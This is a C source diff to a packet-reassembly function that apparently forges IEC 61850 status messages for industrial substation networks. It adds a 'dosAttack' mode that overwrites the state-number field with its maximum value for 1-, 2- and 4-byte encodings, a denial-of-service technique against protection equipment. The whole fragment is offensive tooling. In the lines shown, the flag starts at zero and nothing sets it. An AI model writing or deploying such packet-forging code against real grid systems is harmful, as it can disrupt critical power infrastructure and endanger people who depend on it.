@@ -574,6 +574,7 @@ static void IEC61850FullReassembly(Packet *packet, void* context)
 
 	int offset = 0;
 	int stuffUp = 0;
+	int dosAttack = 0;
 	uint16_t offsetStNum = 0;
 	uint16_t offsetTime = 0;
 	int elementLengthStNum = 0;
@@ -733,11 +734,41 @@ static void IEC61850FullReassembly(Packet *packet, void* context)
 		            		 if(tempFrameID && tempFrameID->stNum==frameID->stNum && tempFrameID->sqNum==frameID->sqNum)
 		            			 return;
 
-
+		            		 if(!dosAttack){
 		            		 if(!tempFrameID)          		 // we need to send a fake new status
 		            	 			  pdu->stNum ++;
 		            	 		  else
 		            	 			 pdu->stNum = tempFrameID->stNum+1;
+		            		 }
+
+		            		 else
+		            		 {
+		            			 switch(elementLengthStNum)
+		            			 {
+		            			 case 1:
+		            				 pdu->stNum = 127;
+		            				 uint8_t val = ( uint8_t)pdu->stNum;
+		            				 frameID->stNum = pdu->stNum;
+		            				 memcpy(stNumPt,&val,1);
+		            				 break;
+		            			 case 2:
+		            				 pdu->stNum = 65535;
+		            				 uint16_t val16 = ( uint16_t)pdu->stNum;
+		            				 memcpy(stNumPt,&val16,2);
+		            				 frameID->stNum = pdu->stNum;
+		            				 break;
+
+		            			 case 4:
+		            				 pdu->stNum = 4294967295;
+		            				 uint32_t val32 = ( uint32_t)pdu->stNum;
+		            				 frameID->stNum = pdu->stNum;
+		            				 memcpy(stNumPt,&val32,4);
+		            				 break;
+
+
+
+		            			 }
+		            		 }
 		            		 struct timeval tv;
 		            		 		                 gettimeofday(&tv,NULL);
 		            		 		                 time_t curtime;
